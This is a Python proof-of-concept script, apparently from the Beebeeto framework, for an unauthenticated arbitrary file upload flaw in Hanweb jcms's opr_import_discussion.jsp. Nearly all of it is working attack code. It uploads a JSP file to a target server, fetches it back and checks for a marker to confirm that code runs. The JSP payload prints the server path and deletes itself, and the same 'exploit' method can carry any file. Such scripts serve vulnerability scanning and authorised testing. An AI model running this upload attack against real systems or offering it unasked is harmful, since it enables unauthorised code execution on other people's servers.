#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0109',
            'name': 'Hanweb jcms /opr_import_discussion.jsp 任意文件上传漏洞 POC',
            'author': 'flsf',
            'create_date': '2014-10-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Hanweb jcms',
            'vul_version': ['*'],
            'type': 'File Upload',
            'tag': ['Hanweb漏洞', '/opr_import_discussion.jsp', 'File Upload', 'jsp'],
            'desc': '''
                    http://127.0.0.1/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S
                    可上传文件,未限制上传文件类型,导致任意文件上传漏洞。
                    ''',
            'references': ['http://wooyun.org/bugs/wooyun-2014-075585',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/v.jsp"
        target_url = args['options']['target'] + "/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S"
        file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
        <%@ page import="java.io.*"%>
        <%
        String path=application.getRealPath(request.getRequestURI());
        File d=new File(path);
        out.println(path);
        if(d.exists()){
        d.delete();
        }
        %>
        <% out.println("00799a96dcc29282dd74e23e49b647a6a");%>
        '''
        files = {'file': ('v.jsp', file_v_jsp, 'multipart/form-data')}

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url

        response = requests.post(target_url, files=files) # 上传
        response = requests.get(verify_url) # 验证
        content = response.content
        if '00799a96dcc29282dd74e23e49b647a6a' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())